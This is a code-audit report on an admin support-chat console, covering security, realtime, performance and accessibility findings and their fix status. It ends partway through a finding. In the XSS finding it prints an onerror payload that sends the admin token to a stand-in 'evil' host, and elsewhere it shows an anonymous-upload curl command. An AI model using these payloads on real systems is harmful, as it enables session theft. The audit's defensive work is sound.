# Chat Feature — Full Flow Audit

**Scope:** the admin support-chat console end to end — player list, conversation
transcript, composer, player info panel, and everything behind it (WebSocket
realtime, REST data, Next.js proxy routes).

**Date:** 2026-10-01
**Branch:** `cursor/jev-decision-helper-b30b`
**Method:** full read of ~19,000 lines across 60 files, plus targeted verification
of every Critical and High claim. Measured figures below are counted, not estimated.

> **Note:** the player-search rework (caching, coalescing, min-length gate) landed
> just before this audit and is *not* re-reported. One self-inflicted gap it left
> is called out in [F-16](#f-16-high--chat-search-proxy-still-has-no-timeout).

---

## Implementation status

### ✅ Phase 1 — Security & resilience (complete)

| Finding | Status | Notes |
|---|---|---|
| [F-1](#f-1-critical--player-text-is-rendered-as-raw-html) | **Fixed** | `lib/chat/sanitize-chat-html.ts`; all 4 sinks routed through it. Fails closed (escapes) when no DOM is present. 15 tests. |
| [F-2](#f-2-critical--chat-upload-never-validates-the-token) | **Partially fixed** | See caveat below. Content-sniffed validation, 10 MB cap, role check, Cloudinary pinned to image-only. |
| [F-5](#f-5-critical--the-error-boundary-is-never-mounted) | **Fixed** | Mounted at both entry points (`page.tsx`, `chat-drawer.tsx`). |
| [F-6](#f-6-critical--usesearchparams-with-no-suspense-boundary) | **Fixed** | `<Suspense>` at both entry points; `/dashboard/chat` now builds as a dynamic route. |
| [F-27](#f-27-medium--proxy-routes-leak-jwt-prefixes-and-backend-errors) | **Fixed** | 7 routes no longer log token prefixes; 9 routes sanitise upstream error bodies via `lib/api/upstream-error.ts`. |

> **Caveat on F-2 — read before treating it as closed.** This codebase has **no
> server-side JWT signature verification anywhere**; every proxy forwards the
> `Authorization` header and lets Django validate. `chat-upload` calls Cloudinary
> directly, so it has no backend to ask. `lib/auth/server-token-guard.ts` therefore
> validates *structure, expiry and role* but **cannot verify the signature** — its
> docblock says so explicitly. It reliably stops `curl -H 'Authorization: x'` and
> expired-session replay. Closing the remainder requires the backend's signing
> secret or a JWKS endpoint.

### Also done alongside Phase 1

- `stripHtml` now uses `DOMParser` instead of assigning `innerHTML` to a detached
  element, so a classification pass can no longer initiate network requests for
  attacker-controlled `<img src>` URLs. Behaviour-preserving; the perf fix
  (caching) remains in Phase 4.
- Deleted the duplicate `stripHtml` in `player-list-sidebar.tsx`; it now uses the
  shared implementation.

Phases 2-5 are untouched — see [Recommended sequence](#recommended-sequence).

---

### ✅ Phase 2 — Agent-facing correctness (complete)

| Finding | Status | Notes |
|---|---|---|
| [F-7](#f-7-high--one-shared-debounce-drops-updates-for-all-but-one-chat) | **Fixed** | New `lib/utils/debounce-by-key.ts`; chat-list updates and read receipts debounce per conversation. Added unmount cleanup. 8 tests. |
| [F-20](#f-20-high--isautomessage-classifies-every-sidebar-preview-as-a-system-card) | **Fixed** | `isAutoMessage` no longer treats a *missing* `userId` as a system marker. 9 tests. |
| [F-21](#f-21-high--avatar-url-is-rendered-as-visible-text) | **Fixed** | New `PlayerAvatar` component; the URL-as-text bug existed in **4** places, not 1. Rejects non-http(s) URLs, falls back to initials on load failure. |
| [F-13](#f-13-high--enter-has-no-ime-guard-and-no-double-send-guard) | **Fixed** | `isComposing`/`keyCode 229` guard; `isSendingRef` concurrency guard; textarea `readOnly` during upload. |
| [F-14](#f-14-high--composer-draft-and-pending-image-leak-across-conversations) | **Fixed** | New `useConversationDrafts`; each conversation keeps its own text + pending image. 12 tests. |
| [F-10](#f-10-high--balance-ticks-wipe-winnings-and-rebuild-the-whole-message-array) | **Not done** | Needs the balance hoisted out of per-message state — a larger refactor. Left for a follow-up. |
| [F-12](#f-12-high--temp-id-dedup-collapses-two-real-messages-into-one) | **Not done** | Needs a `client_msg_id` echoed by the backend. Blocked on backend. |
| [F-17](#f-17-high--the-5-minute-allplayers-cache-is-never-invalidated) | **Not done** | Belongs with the Phase 3 cache/proxy work. |
| [F-18](#f-18-high--online-players-never-appear-without-a-manual-refresh) | **Fixed** | `live_status` for an unknown player now schedules a debounced refetch, checked against an id mirror rather than inside the state updater. |

### Cleaned up alongside Phase 2

- `handlePlayerSelect` was missing `markChatAsReadDebounced` from its dependency
  array behind an `eslint-disable`, so a changed debouncer identity meant the
  conversation was selected but never marked read. Fixed, and the now-unused
  `markChatAsRead` destructure removed.
- Deleted four dead refs in `chat-component.tsx` (`isRefreshingMessagesRef`,
  `refreshTimeoutRef`, `scrollPositionBeforeRefreshRef`,
  `displayedMessageIdsRef`). The first was never set to `true`, so four
  "CRITICAL: don't auto-scroll while refreshing" guards were permanently-false
  branches; the last mutated a Set during render for no reader.
- `chat-component.tsx` now has **zero** eslint warnings.

### ✅ Phase 3 — Request hygiene (complete)

| Finding | Status | Notes |
|---|---|---|
| [F-15](#f-15-high--10-of-12-proxy-routes-have-no-upstream-timeout) | **Fixed** | New `lib/api/proxy-fetch.ts` + `proxy-route-response.ts`. All **12** chat proxy routes migrated; no bare `fetch` to the backend remains. 13 tests. |
| [F-16](#f-16-high--chat-search-proxy-still-has-no-timeout) | **Fixed** | The gap left by the search rework now has its own timeout, composed with the cache's cancellation signal. |
| [F-19](#f-19-high--refreshactivechats-has-no-coalescing-abort-or-sequencing) | **Fixed** | Monotonic ticket so a slow response cannot overwrite a newer one; in-flight coalescing with one trailing refresh; `AbortController`; errors now surface and 401/403 reports an expired session. |
| [F-29](#f-29-medium--a-10s-poll-runs-app-wide-forever) | **Fixed** | Poll pauses on `visibilitychange` and while the tab is hidden; the in-flight request is aborted on unmount. |
| [F-17](#f-17-high--the-5-minute-allplayers-cache-is-never-invalidated) | **Fixed** | `invalidatePlayersCache()` exposed on the context and called from the manual-adjustment path, the WebSocket balance branch, and `loadMorePlayers`. |
| [F-25](#f-25-medium--pagination-appends-blindly-onto-a-reordering-list) | **Fixed** | `loadMorePlayers` now dedupes by `user_id` on append and warns when rows are dropped. |

Three outcomes are kept distinct by `proxyErrorResponse`: a **caller disconnect**
(499, nobody left to answer), an **upstream timeout** (504, retryable) and a
**genuine network failure** (502). Every response carries a `request_id` that
matches the server log line.

### ✅ Phase 4 — Rendering performance (complete)

| Finding | Status | Notes |
|---|---|---|
| [F-4](#f-4-critical--scroll-state-re-renders-the-whole-transcript-on-every-frame) | **Fixed** | `stripHtml` memoised (bounded, 500); new `message-classification.ts` runs all four classifiers once per message object in a `WeakMap`, shared by the parent list and the bubble. Proven: a second pass over 200 messages performs **0** HTML parses (was ~19 per row per render). 16 tests. |
| [F-24](#f-24-medium--inline-props-defeat-reactmemo-on-three-children) | **Fixed** | `commonEmojis` hoisted to module scope; `onToggleExpanded` wrapped in `useCallback`; `handleTogglePin` keys off `selectedPlayer.id`; `MessageBubble` takes `avatarUrl` + `playerUsername` instead of the whole `ChatUser`, so balance events no longer re-render every bubble. |
| [F-32](#f-32-low--dead-code-inventory) | **Partially done** | Deleted `messages-container.tsx` (162), `use-message-cache.ts` (237), `use-viewport-messages.ts` (214), `lib/api/chat.ts` (57) and the unauthenticated `app/api/chat-users` route. ~670 lines removed. `ChatDrawer`/`ControlGrid` left in place — see below. |

`formatTransactionMessage` now accepts pre-parsed details, removing a duplicate
`parseTransactionMessage` pass (~20 `String.match` calls) per transaction row.

### A build break worth recording

`messages-container.tsx` was dead but still type-checked, so the narrowed
`MessageBubble` props broke `npm run build`. The audit had already flagged that
the file "would not compile if it were ever wired back in" — that is exactly what
happened. Deleting it was the fix, not a workaround.

### Still open

- **F-3** virtualisation — deliberately deferred. Per-row cost is now a cache
  hit, so this is a scaling change rather than a smoothness fix, and it needs a
  dependency plus a design decision.

### ✅ Phase 5 — Architecture & accessibility (complete)

| Finding | Status | Notes |
|---|---|---|
| [F-9](#f-9-high--three-refs-are-read-inside-usememo-with-no-dependency) | **Fixed** | New `useTrackedRef`. `pinnedQueryPlayer` and `lastManualPayment` are depend-able refs whose identity changes only when the value does. 5 tests. |
| [F-8](#f-8-high--deep-links-are-read-then-erased-the-back-button-is-broken) | **Fixed** | New `useChatUrlSync`. The URL is now **written** on selection (`?playerId=`) instead of erased, so it is shareable and Back walks back through conversations. All 9 strip sites removed. |
| [F-22](#f-22-medium--escape-in-any-drawer-destroys-the-whole-console) | **Fixed** | `useOverlayBehaviour` — Escape only reaches the top-most overlay, focus moves in and is restored on close, Tab is trapped, and the body scroll lock is reference-counted. 10 tests. |
| [F-31](#f-31-medium--six-overlays-inconsistent-escapefocusscroll-lock) | **Fixed** | All six overlays (4 drawers, image modal, chat drawer) share the behaviour. Previously 2 of 6 handled Escape at all. |
| [F-30](#f-30-medium--accessibility-gaps-in-the-shell) | **Fixed** | Transcript is keyboard-scrollable; the player list is a real `listbox`/`option` with `aria-selected`; the tab switcher is a `tablist`; the `aria-live` region moved off the scroller to an `sr-only` node that announces only new player messages; focus moves into the conversation panel on mobile. |

### How the Escape bug is prevented, not just fixed

The test *closes the top overlay on Escape, not the one beneath it* mounts a
console overlay with a balance drawer on top, presses Escape, and asserts the
console was **not** closed. That is the original data-loss scenario — an operator
discarding in-flight `balanceValue` / `balanceRemarks` — pinned as a regression
test.

### Still open, deliberately

- **F-3** virtualisation — deferred; now a scaling change rather than a smoothness one.
- **F-10** balance hoisted out of per-message state — a structural refactor.
- **F-12** temp-id dedup — blocked on a backend `client_msg_id`.
- **F-2** signature verification — blocked on the backend signing secret.
- **F-32 (remainder)** `ChatDrawer`/`ControlGrid`: `ControlGrid` is never rendered,
  so the drawer cannot open. Left in place pending a product decision rather than
  deleted, since it is an unwired feature rather than wrong code.

---

## Summary across all five phases

| Phase | Findings fixed |
|---|---|
| 1 — Security & resilience | F-1, F-2 (partial), F-5, F-6, F-27 |
| 2 — Agent-facing correctness | F-7, F-13, F-14, F-17, F-18, F-20, F-21, plus the `markChatAsReadDebounced` dep and four dead refs |
| 3 — Request hygiene | F-15, F-16, F-19, F-25, F-27 (error paths), F-29 |
| 4 — Rendering performance | F-4, F-24, F-32 (mostly) |
| 5 — Architecture & accessibility | F-8, F-9, F-22, F-30, F-31 |

Roughly **1,300 lines removed** and **2,000 added**, with the added lines almost
entirely tests, docblocks and defensive validation.

**Blocked on the backend team, not on us:**

1. A `client_msg_id` echoed back on the WebSocket (F-12).
2. The signing secret or a JWKS endpoint, so `chat-upload` can verify its token
   properly (F-2).
3. Confirmation that Django escapes player text before it reaches the client
   (F-1) — the client-side fix stands either way.

**Recommended next:** F-3 (virtualisation), once the team is ready to make a
dependency decision. Everything else is either done or waiting on the backend.

---

## The 60-second version

> **Historical** — this is the state as first audited, before the phases below.

The chat works, and the happy path is genuinely solid — the message-history
fetcher has proper abort + staleness guards, modal state resets are correct,
reconnect backoff is right, and the media/deliberate-animation work is thoughtful.

But it is being held together by luck in four specific places, and there are two
remotely-reachable security holes. Ranked:

1. **Two security holes** — player-authored text is rendered as raw HTML, and the
   image-upload endpoint never validates the token it checks for.
2. **The transcript is not virtualised and re-renders per scroll frame** — at
   ~19 HTML parses per row per render, the cost is O(n²) over a scroll gesture.
3. **One shared debounce timer drops updates** for every chat except the last one
   typed within its window.
4. **Three derived values are stored in refs and read inside `useMemo` with no
   dependency**, so correctness depends on incidental WebSocket traffic.

None of the top four need a rewrite. Three are small, surgical fixes.

---

## Findings index

| # | Severity | Area | Finding |
|---|---|---|---|
| [F-1](#f-1-critical--player-text-is-rendered-as-raw-html) | 🔴 Critical | Security | Player text rendered as raw HTML — stored XSS in the admin session |
| [F-2](#f-2-critical--chat-upload-never-validates-the-token) | 🔴 Critical | Security | `chat-upload` checks token *presence* only, never validity |
| [F-3](#f-3-critical--the-transcript-is-not-virtualised) | 🔴 Critical | Perf | No virtualisation; list grows unbounded |
| [F-4](#f-4-critical--scroll-state-re-renders-the-whole-transcript-on-every-frame) | 🔴 Critical | Perf | ~19 HTML parses per row per scroll frame |
| [F-5](#f-5-critical--the-error-boundary-is-never-mounted) | 🔴 Critical | Resilience | One render throw kills the entire chat route |
| [F-6](#f-6-critical--usesearchparams-with-no-suspense-boundary) | 🔴 Critical | Perf | Route bails out of server rendering |
| [F-7](#f-7-high--one-shared-debounce-drops-updates-for-all-but-one-chat) | 🟠 High | Realtime | Cross-chat updates silently discarded |
| [F-8](#f-8-high--deep-links-are-read-then-erased-the-back-button-is-broken) | 🟠 High | UX | Back leaves the console; URL never written |
| [F-9](#f-9-high--three-refs-are-read-inside-usememo-with-no-dependency) | 🟠 High | State | Correctness depends on incidental traffic |
| [F-10](#f-10-high--balance-ticks-wipe-winnings-and-rebuild-the-whole-message-array) | 🟠 High | Realtime | Winnings erased; O(n) rebuild on every tick |
| [F-11](#f-11-high--reconnect-replaces-all-paged-in-history-no-catch-up-exists) | 🟠 High | Realtime | No catch-up; >20-message gaps lost silently |
| [F-12](#f-12-high--temp-id-dedup-collapses-two-real-messages-into-one) | 🟠 High | Realtime | Agent's own messages vanish |
| [F-13](#f-13-high--enter-has-no-ime-guard-and-no-double-send-guard) | 🟠 High | Composer | CJK agents can't type; images send twice |
| [F-14](#f-14-high--composer-draft-and-pending-image-leak-across-conversations) | 🟠 High | Composer | Agent can send A's context to B |
| [F-15](#f-15-high--10-of-12-proxy-routes-have-no-upstream-timeout) | 🟠 High | Data | A hung backend hangs the request forever |
| [F-16](#f-16-high--chat-search-proxy-still-has-no-timeout) | 🟠 High | Data | Gap left by the search rework |
| [F-17](#f-17-high--the-5-minute-allplayers-cache-is-never-invalidated) | 🟠 High | Data | Stale balances for up to 5 minutes |
| [F-18](#f-18-high--online-players-never-appear-without-a-manual-refresh) | 🟠 High | Realtime | The "add player" branch is a no-op |
| [F-19](#f-19-high--refreshactivechats-has-no-coalescing-abort-or-sequencing) | 🟠 High | Data | Out-of-order responses overwrite newer data |
| [F-20](#f-20-high--isautomessage-classifies-every-sidebar-preview-as-a-system-card) | 🟠 High | Rendering | Customer messages rendered as transactions |
| [F-21](#f-21-high--avatar-url-is-rendered-as-visible-text) | 🟠 High | Rendering | Shows a clipped URL instead of the avatar |
| [F-22](#f-22-medium--escape-in-any-drawer-destroys-the-whole-console) | 🟡 Medium | UX | Losing in-flight financial input |
| [F-23](#f-23-medium--deep-link-selection-implemented-eight-times) | 🟡 Medium | State | One change needs eight edits |
| [F-24](#f-24-medium--inline-props-defeat-reactmemo-on-three-children) | 🟡 Medium | Perf | Composer and every bubble re-render |
| [F-25](#f-25-medium--pagination-appends-blindly-onto-a-reordering-list) | 🟡 Medium | Data | Duplicate and skipped rows |
| [F-26](#f-26-medium--404-is-rewritten-as-success-with-an-empty-array) | 🟡 Medium | Data | Real failures render as "no data" |
| [F-27](#f-27-medium--proxy-routes-leak-jwt-prefixes-and-backend-errors) | 🟡 Medium | Security | Credentials and internals in logs |
| [F-28](#f-28-medium--client-params-interpolated-into-the-upstream-url) | 🟡 Medium | Security | Param injection; unbounded page sizes |
| [F-29](#f-29-medium--a-10s-poll-runs-app-wide-forever) | 🟡 Medium | Data | 360 req/hr per admin on unrelated pages |
| [F-30](#f-30-medium--accessibility-gaps-in-the-shell) | 🟡 Medium | A11y | No focus mgmt, no list semantics, not keyboard-scrollable |
| [F-31](#f-31-medium--six-overlays-inconsistent-escapefocusscroll-lock) | 🟡 Medium | A11y | 2 of 6 handle Escape at all |
| [F-32](#f-32-low--dead-code-inventory) | 🔵 Low | Hygiene | ~700 lines unreachable |
| [F-33](#f-33-low--smaller-rendering-and-correctness-nits) | 🔵 Low | Misc | Timestamps, KYC dead code, scroll restore |

---

## 🔴 Critical

### F-1: Critical — Player text is rendered as raw HTML
**Area:** Security

**Where:** `components/chat/components/message-bubble.tsx:246`, `:517` ·
`components/chat/sections/pinned-messages-section.tsx:102` ·
`components/chat/sections/player-list-sidebar.tsx:182`

There are **four** `dangerouslySetInnerHTML` sinks in the chat, and **no sanitiser
anywhere in the project** — verified: `dompurify` is not in `package.json` and
`sanitize` appears in neither `components/chat` nor `lib/chat`.

```tsx
// message-bubble.tsx:514-518
const shouldRenderAsHtml = messageHasHtml || linkedText !== displayText;
return shouldRenderAsHtml ? (
  <div dangerouslySetInnerHTML={{ __html: linkedText ?? '' }} />
```

`messageHasHtml` is only a regex:

```ts
// message-helpers.ts:40
/<a-z?[^>]*>/i
```

So **any message containing a tag is rendered as HTML by design.**
`prepareChatMessageHtmlForDisplay` only relabels currency lines — it never escapes.
The codebase's own type documents the assumption:

```ts
// types/chat.ts:57
/** Edited over the socket. Render text as plain text, never as HTML. */
renderAsText?: boolean;
```

i.e. only *edited* messages are considered safe; everything else is trusted HTML.

**Consequence:** a player sends
`<img src=x onerror="fetch('//evil/?t='+localStorage.auth_token)">` and it executes
in the support agent's authenticated session. `innerHTML` won't run `<script>` but
it *will* run `onerror`. The admin token is in localStorage
(`storage.get(TOKEN_KEY)`, `chat-component.tsx:1452`), so this is a full console
compromise — and it's persistent, because it re-renders from `message.text` on
every history load. There's a second, subtler vector: `linkifyText` doesn't escape
either, so any message containing *both* a tag and a URL flips
`linkedText !== displayText` and takes the HTML branch.

**Fix:** sanitise at the sink, not in the render logic.

```ts
import DOMPurify from 'dompurify';

const SAFE = { ALLOWED_TAGS: ['b','strong','i','em','br','a','ul','ol','li','p','span'],
               ALLOWED_ATTR: ['href','class'] };
```

Then force `target="_blank" rel="noopener noreferrer"` on surviving anchors. Do it
in one shared helper and route all four sinks through it. Longer term, render the
known system-message subset as React nodes and treat everything else as text.

> **Unverified:** I did not trace the Django backend to confirm it passes player
> text through unescaped. Every client-side path treats it as HTML, which is the
> defect regardless — but check the server before you size the incident.

---

### F-2: Critical — `chat-upload` never validates the token
**Area:** Security

**Where:** `app/api/chat-upload/route.ts:17-31`

The endpoint's own comment is honest about it — `// Get auth token (optional
validation)` — and the token is then never used:

```ts
const authHeader = request.headers.get('Authorization');
if (!authHeader) { return 401; }        // presence only — never verified

if (!file.type.startsWith('image/')) {  // attacker-controlled multipart metadata
  return 400;
}
```

`curl -H 'Authorization: x' -F 'file=@payload.svg'` uploads anonymously. Because
`resource_type: 'auto'` in `lib/utils/cloudinary.ts:58` ingests whatever bytes
arrive, and `IMAGE_URL_REGEX` in `apply-chat-message-event.ts:2` explicitly
whitelists `.svg`, arbitrary content lands in the chat CDN bucket. There's also no
size cap and `await request.formData()` (`:6`) buffers the whole body in memory —
a memory-exhaustion vector on an unauthenticated endpoint.

**Fix:** verify the bearer token (reuse `lib/auth/jwt-exp.ts`) and require an
admin/agent role. Validate by magic bytes (`file-type`), not `file.type`. Enforce a
server-side size cap. Pin `resource_type: 'image'` with an `allowed_formats`
allowlist.

**Also:** `app/api/chat-users/route.ts:18-20` is the only sibling route with *no*
auth check at all. It's currently dead code (no callers) — delete it rather than
leave an open proxy to `/api/v1/players/?page_size=100`.

---

### F-3: Critical — The transcript is not virtualised
**Area:** Performance

**Where:** `components/chat/chat-component.tsx:570-571`, `:3508`

```tsx
const visibleMessages = useMemo(() => {
  let messages = wsMessages;    // ← every loaded message, never sliced
```

`groupedMessages` then maps the whole set into the DOM every render. There is no
windowing anywhere. `hooks/use-viewport-messages.ts` implements windowing with
spacer math — and has **zero references** outside its own definition, so it's dead
and shouldn't be re-enabled as-is (it has its own bugs).

History prepending is also unbounded: `use-scroll-management.ts:211-239` loops up
to 50 times and keeps going while the sentinel is within 3 viewports.

**Consequence:** a 20k-message conversation mounts 20k bubbles. This is the single
biggest scaling cliff in the feature, and it compounds [F-4](#f-4-critical--scroll-state-re-renders-the-whole-transcript-on-every-frame).

**Fix:** window the list — `react-virtuoso` is the right tool, because variable-height
chat rows plus prepend anchoring is exactly the hard part and it handles it
natively (`followOutput`, `scrollToBottom`, first-item-anchor preservation). As a
stopgap: cap `wsMessages` to the last N and gate `hasMoreHistory` behind an explicit
"Load older messages" button.

---

### F-4: Critical — Scroll state re-renders the whole transcript on every frame
**Area:** Performance

**Where:** `components/chat/hooks/use-scroll-management.ts:69-81`, consumed at
`chat-component.tsx:3454`

```ts
const evaluatePosition = useCallback(() => {
  if (isAutoScrollingRef.current) return;
  const atBottom = checkIfAtBottom();
  setIsUserAtBottom(atBottom);      // ← state owned by the 3,755-line component
}, [...]);
```

`isUserAtBottom` is `useState` in the orchestrator. Every scroll frame (throttled
only to 16ms) sets it, re-rendering `ChatComponent`, re-running both expensive
memos — and in particular re-running the message classification below.

**`stripHtml` fires the HTML parser ~19× per row per render.**

```ts
// message-helpers.ts:58-64
export const stripHtml = (html: string): string => {
  if (typeof document !== "undefined") {
    const tmp = document.createElement("DIV");
    tmp.innerHTML = html;                       // full HTML tokenizer + tree builder
    return tmp.textContent || tmp.innerText || "";
```

Tracing one row through `chat-component.tsx:3531-3558`: `isAutoMessage` → 1,
its body → 1, `isPurchaseNotification` → 2, `isPrizeWheelMessage` → 1,
`isKycVerificationMessage` → 1, the standalone calls → 4, and the `isConsecutive`
block re-runs all four classifiers on `prevMessage` → 9. **≈19 calls per row**, each
allocating a DOM element and running the HTML parser. At 300 messages that's ~5,700
parser invocations per render — and per scroll *frame*.

Three separate problems here, worth separating:

- **Cost.** The `document` branch is roughly two to three orders of magnitude more
  expensive than the regex branch sitting three lines below it — and the two
  branches *disagree* (`innerText` on a detached node ≠ the regex output), so
  classification is environment-dependent.
- **Correctness.** `stripHtml` is **not a sanitiser and must not be used as one.**
  Because it round-trips through the parser, `stripHtml('<img src=x onerror=alert(1)>')`
  returns `""` — so any guard written as "does the plain text look dangerous?"
  silently passes on tag-only payloads.
- **Side effects.** A detached `div.innerHTML = html` sets `img.src`, and browsers
  **do** initiate fetches for `src` on detached images. Every classification pass
  can therefore fire network requests for attacker-controlled URLs.

**Fix, in order of value:**

1. **Cache classification per message object** — `new WeakMap<ChatMessage, Classification>()`.
   Message objects are stable (`chat-component.tsx:721-725` only spreads when there's
   an enhancement), so this makes the whole suite O(1) after first render. Biggest
   win, smallest diff.
2. **Collapse the 19 calls to 1** — one `classify(message)` returning
   `{isAuto, isPurchase, isPrizeWheel, isKyc, kind, details}` from a single
   `stripHtml` result, and derive `isConsecutive` from the previous row's cached
   result instead of recomputing.
3. **Move `isUserAtBottom` out of the orchestrator** — a ref plus a
   `useSyncExternalStore`-style subscription, or debounce the state write to ~120ms.
4. **Drop the `document` branch** and always use the regex path, or hoist `stripHtml`
   out of render entirely.

Also: `stripHtml` exists as a **second copy** at `player-list-sidebar.tsx:19-23`.
Delete one and share it.

---

### F-5: Critical — The error boundary is never mounted
**Area:** Resilience

**Where:** `components/chat/components/error-boundary.tsx:20`

`ChatErrorBoundary` is defined and exported from `components/chat/components/index.ts:6`.
Verified call sites: **zero.** The only match in the whole repo is its own class
declaration. Both mount points render the orchestrator bare:

```tsx
// chat-drawer.tsx:52          // app/dashboard/chat/page.tsx:16
<ChatComponent />
```

The "Something went wrong with the chat / Try Again" UI at `error-boundary.tsx:58-99`
is unreachable. `components/chat/README.md:126-135` documents a usage that was
never written.

**Consequence:** any render throw — in a 3,755-line component with 32 state hooks,
or in `MessageBubble` (812 lines), or in `PlayerInfoSidebar` (667 lines) — takes
down the entire chat route with no recovery. The agent loses the console mid-shift.

**Fix:** wrap both mount points.

```tsx
<ChatErrorBoundary onError={(e, i) => reportError(e, i)}>
  <ChatComponent />
</ChatErrorBoundary>
```

---

### F-6: Critical — `useSearchParams()` with no Suspense boundary
**Area:** Performance

**Where:** `components/chat/chat-component.tsx:156`; no `<Suspense>` in
`app/dashboard/chat/page.tsx` or `components/chat/chat-drawer.tsx`

```ts
const searchParams = useSearchParams();
```

This isn't a house-style accident — sibling routes in this repo do it correctly:

- `app/dashboard/history/transactions/page.tsx:121` → `<Suspense fallback={…}>`
- `app/dashboard/history/game-activities/page.tsx:93` → `<Suspense fallback={…}>`

**Consequence:** the chat route bails out of server rendering, so the operator gets
a blank frame until the JS bundle hydrates — on the one screen where instant context
matters most. In Next 15 this is also the documented precondition for
`useSearchParams` build errors on prerendered routes.

> **Uncertain:** I'm inferring the bailout from the missing boundary rather than
> observing a build failure. `next.config.ts` has no `output: 'export'`, so it
> currently builds. The fix is ~3 lines and matches existing house style regardless.

**Fix:** wrap `<ChatComponent />` in `<Suspense>` in both places.

---

## 🟠 High

### F-7: High — One shared debounce drops updates for all but one chat
**Area:** Realtime

**Where:** `hooks/use-chat-users.ts:148-151`, fired from `:512` ·
`lib/websocket-manager.ts:622-640`

```ts
const debouncedChatUpdateRef = useRef(
  debounce((...args) => { /* … */ }, WS_UPDATE_COOLDOWN)
);
…
debouncedChatUpdateRef.current(updateData);   // :512 — for EVERY chat
```

The `debounce` helper is a single-timer implementation:

```ts
let timeoutId: NodeJS.Timeout | null = null;
return (...args) => {
  if (timeoutId) clearTimeout(timeoutId);        // ← kills the previous call
  timeoutId = setTimeout(() => { func(...args); timeoutId = null; }, delay);
};
```

**Consequence:** two players messaging within the cooldown → the *first* player's
`lastMessage` / `lastMessageTime` update is discarded outright. Only the last
`args` survive. The same class of bug affects `markChatAsReadDebounced` (`:1124`),
whose 300ms window can swallow a read receipt for a different chat. The wrong row
then persists until the 10s poll corrects it.

Note the per-chat `chatLastUpdateRef` cooldown *inside* the callback is correct —
the bug is purely the shared timer in front of it.

**Fix:** debounce **per chat key** — keep a `Map<string, debouncedFn>` in a ref — or
drop the debounce entirely and rely on the per-chat cooldown already implemented at
`:154-160`.

---

### F-8: High — Deep links are read, then erased; the Back button is broken
**Area:** UX

**Where:** 9 call sites in `chat-component.tsx` — `:1684`, `:2590`, `:2648`,
`:2730`, `:2777`, `:2908`, `:2937`, `:3089`, `:3161`

```tsx
// Clear URL params after a short delay
setTimeout(() => {
  router.replace("/dashboard/chat", { scroll: false });
}, 100);
```

`?playerId=` / `?username=` are only ever **consumed and stripped**. There is no
`router.push` with the param anywhere in the file — verified.

**Consequence:** the URL is never a shareable or restorable description of which
conversation is open. After deep-linking, pressing Back goes to whatever preceded
`/dashboard/chat` (often the dashboard), **not** to the previous conversation.
Back/forward is effectively broken. `replace` is the correct primitive for
consume-semantics, but combined with never writing the param it makes the URL
pure dead weight.

**Fix:** write the param on selection
(`router.push('/dashboard/chat?playerId=' + id, {scroll:false})`), drop the 100ms
strip entirely, and derive selection from `searchParams` in one effect. The
six-effect deep-link cluster ([F-23](#f-23-medium--deep-link-selection-implemented-eight-times))
then collapses into it.

---

### F-9: High — Three refs are read inside `useMemo` with no dependency
**Area:** State

**Where:** `chat-component.tsx:1036`, `:1182`, `:575-604`

```tsx
// :1036 — read inside the memo
if (queryParamPlayerRef.current && queryParamPlayerRef.current.user_id) { … }

// :1210-1220 — dep array
}, [activeTab, apiOnlinePlayers, activeChatsUsers, allPlayers, searchQuery, … ]);
```

`queryParamPlayerRef` is assigned at `:2561`, `:2613`, `:2679`, `:2881`, `:3063`,
`:3145` — inside effects that never touch the dep list. React is free to discard
the memo cache at any time.

Same pattern in `visibleMessages`, which reads `lastManualPaymentRef.current`
inside the memo while its deps are only `[wsMessages, selectedPlayer?.user_id]`.
The ref is set at `:2267` and cleared 10s later by an untracked `setTimeout` at
`:2275-2279`, so the 5-second attribution window (`:572`) and the 10-second timer
have **no ordering guarantee**.

**Consequence:**
- The "always pin the deep-linked player into the list" guarantee (comments at
  `:1034-1035`, `:2611-2612`) only holds if one of nine unrelated deps happens to
  change afterwards. A deep-linked player on a later page intermittently appears or
  vanishes depending on incidental WebSocket traffic.
- Manual-adjustment `operationType` attribution only recomputes when `wsMessages`
  happens to change. Two adjustments in quick succession can stamp the wrong
  increase/decrease badge on a message.

**Fix:** refs must never feed `useMemo`. Promote both to state and add to the deps.

---

### F-10: High — Balance ticks wipe winnings and rebuild the whole message array
**Area:** Realtime

**Where:** `hooks/use-chat-websocket.ts:863-878`

```ts
const winningBalanceStr = winningBalance !== undefined && winningBalance !== null
  ? String(winningBalance) : undefined;

setMessages(prev => prev.map(msg =>
  msg.userId === Number(playerId) || msg.sender === "player"
    ? { ...msg, userBalance: balanceStr, winningBalance: winningBalanceStr }
    : msg,
));
```

`winningBalanceStr` is spread **unconditionally**, so any payload carrying only a
main balance — the common single-balance case — overwrites a known winnings value
with `undefined`. Displayed winnings flicker to empty on every recharge/cashout.

This runs from the "universal ledger extraction" block at `:1095-1116`, which
fires on **any** inbound frame carrying a ledger field regardless of `type`, so it
is not a rare path. Two costs in one: the correctness bug, and a full array copy
with fresh object identities per message — forcing a complete transcript re-render
on every balance tick. (`msg.sender === "player"` also makes the `msg.userId`
test redundant.)

**Related:** `updateMessagesBalance` (`:1755-1781`) accepts a `winningBalance`
parameter, `console.log`s it at `:1762`, and **never applies it**. The signature
advertises it in `UseChatWebSocketReturn:269`, so callers reasonably assume winnings
were updated.

**Fix:** only spread `winningBalance` when it's defined; apply it in
`updateMessagesBalance` or drop it from the signature so the type stops lying.
Longer term, hoist balance out of per-message state into a single `playerBalance`
value so a tick is an O(1) write.

---

### F-11: High — Reconnect replaces all paged-in history; no catch-up exists
**Area:** Realtime

**Where:** `hooks/use-chat-websocket.ts:994-1000` + `:198`

```ts
// every successful open
if (resolveSafeChatroomId(chatIdRef.current, userId)) {
  void fetchMessageHistory(1, "replace");
}
…
const combined = mode === "prepend" ? [...incoming, ...existing] : incoming;
```

Replace mode keeps only the 20 messages in page 1. An agent who scrolled back
through five pages loses that scrollback on any reconnect — routine, given
`maxReconnectAttempts: 5` and a 30s cap. `historyPagination` is reset too, so it's
recoverable only by scrolling again.

**On message loss specifically:** there is **no sequence number, no cursor, no
resume token, and no gap detection anywhere in this file.** The only catch-up is
"refetch the newest 20". Messages arriving while the socket is down are silently
lost if more than 20 land in the gap, and the client cannot detect it.

**Fix:** send the last-seen message id on reconnect so the server can replay the
delta; make the `onOpen` refetch `"prepend"` and merge by id; surface an explicit
"messages may have been missed" affordance when the gap exceeds the page.

---

### F-12: High — Temp-ID dedup collapses two real messages into one
**Area:** Realtime

**Where:** `hooks/use-chat-websocket.ts:1192-1203`

```ts
const filtered = prev.filter((msg) => {
  if (!msg.id.startsWith("temp-")) return true;
